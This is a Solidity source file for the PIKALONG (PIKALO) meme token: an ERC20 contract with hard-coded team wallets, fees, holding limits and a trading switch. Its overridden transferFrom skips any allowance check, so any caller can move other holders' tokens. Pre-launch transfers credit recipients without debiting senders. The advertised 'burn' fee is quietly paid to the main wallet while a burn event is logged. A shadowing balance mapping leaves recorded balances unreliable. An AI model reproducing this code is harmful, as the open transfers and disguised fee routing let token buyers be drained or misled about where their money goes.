// $PIKALO - PIKALONG
// https://pikalong.vip
// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.8.18;

import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/utils/math/SafeMath.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract PikaLongToken is ERC20, Ownable {
    using SafeMath for uint256;
    bool private isOpen = false; 

    address private main_Wallet = 0x1Ea6922E159EBA76266686B651EaC602D932c7f3; 
    address private dev_Wallet = 0x25d3aF1a2B5fD4aeA86a6d966A32D12bA28863c8;
    address private airdrop_Wallet = 0x4030Aa806daff288bf03414Ac7ce02B932665B36;
    address private market_Wallet = 0xf29aEF2e0F4cB37A90c45c0c07784B666018ed85;
    
    address constant deadWallet = 0x000000000000000000000000000000000000dEaD;
    address constant zeroWallet = 0x0000000000000000000000000000000000000000;

    mapping(address => bool) public exceptFeeList;
    mapping(address => bool) public authorityList;
    mapping (address => uint256) _balances;

    event ClearToken(address TokenAddressCleared, uint256 Amount);

    /// Total Supply = 350,600,600,600,000
    uint256 _totalSupply = 350600600600000 * 10**18; 
    uint256 private liquidity_Supply = 10**18 * 329564564564000; // 94%
    uint256 private dev_Supply = 10**18 * 3506006006000; // game dev supply 1%
    uint256 private airdrop_Supply = 10**18 * 3506006006000; // 1%
    uint256 private market_Supply = 10**18 * 14024024024000; // 4%

    uint256 private totalFee = 2;
    uint256 private burnFee = 1;
    uint256 private TXRate = 100;
    uint256 private threshold = _totalSupply * 50/1000; 

    uint256 private maxTXOrder = _totalSupply.mul(1).div(100);
    uint256 private maxWalletHolding = _totalSupply.mul(1).div(100);

    constructor() ERC20("PIKALONG", "PIKALO") {
        _mint(main_Wallet, liquidity_Supply);
        _mint(dev_Wallet, dev_Supply);
        _mint(airdrop_Wallet, airdrop_Supply);
        _mint(market_Wallet, market_Supply);
        exceptFeeList[main_Wallet] = true;
        exceptFeeList[dev_Wallet] = true;
        exceptFeeList[airdrop_Wallet] = true;
        exceptFeeList[market_Wallet] = true;
        exceptFeeList[address(this)] = true;
        authorityList[main_Wallet] = true;
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        return transferFrom(msg.sender, recipient, amount);
    }
  
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        if (isOpen) { 
            return normalTransfer(sender, recipient, amount); 
        }

        if (!authorityList[sender] && !authorityList[recipient]) {
            require(isOpen, "Trading not allowed yet");
        }
        
        if (!authorityList[sender] && recipient != address(this) && recipient != address(deadWallet) && recipient != address(zeroWallet)) {
            uint256 token = balanceOf(recipient);
            require((token + amount) <= maxWalletHolding, "Holding is limited");
        }

        require(amount <= maxTXOrder || authorityList[sender], "TX Limit Exceeded");

        uint256 TXAmount = (exceptFeeList[sender] || exceptFeeList[recipient]) ? amount : payFee(sender, amount);
        _balances[recipient] = _balances[recipient].add(TXAmount);

        emit Transfer(sender, recipient, TXAmount);
        return true;
    }

    function payFee(address sender, uint256 amount) internal returns (uint256) {
        uint256 TXFee = amount.mul(totalFee).mul(TXRate).div(TXRate * 100);
        uint256 burnAmounts = TXFee.mul(burnFee).div(totalFee);
        uint256 contractFee = TXFee.sub(burnAmounts);
        _balances[address(this)] = _balances[address(this)].add(contractFee);
        _balances[main_Wallet] = _balances[main_Wallet].add(burnAmounts);
        emit Transfer(sender, address(this), contractFee);
        
        if (burnAmounts > 0) {
            _totalSupply = _totalSupply.sub(burnAmounts);
            emit Transfer(sender, zeroWallet, burnAmounts);  
        }
        return amount.sub(TXFee);
    }

    function normalTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function clearToken(address tokenAddress, uint256 tokens) external returns (bool success) {
        if (tokens == 0) {
            tokens = ERC20(tokenAddress).balanceOf(address(this));
        }
        emit ClearToken(tokenAddress, tokens);
        return ERC20(tokenAddress).transfer(main_Wallet, tokens);
    }

    function getPayment() external { 
        payable(main_Wallet).transfer(address(this).balance);   
    }

    function openTrading() external onlyOwner {
        isOpen = true;
    }

    function burn(uint256 amount) external {
        _burn(msg.sender, amount);
    }
}